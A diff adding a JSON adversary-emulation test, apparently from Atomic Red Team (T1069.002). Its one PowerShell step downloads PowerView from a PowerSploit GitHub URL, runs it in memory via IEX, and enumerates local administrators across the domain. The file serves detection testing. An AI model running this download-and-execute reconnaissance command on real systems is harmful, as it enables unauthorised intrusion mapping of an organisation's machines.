@@ -1,0 +1,23 @@
+{
+  "id": "a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd",
+  "name": "Find local admins on all machines in domain (PowerView)",
+  "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "4c94828e-24fb-4ad6-bf2c-64c307edb248",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1069.002",
+    "atomic-red-team"
+  ]
+}
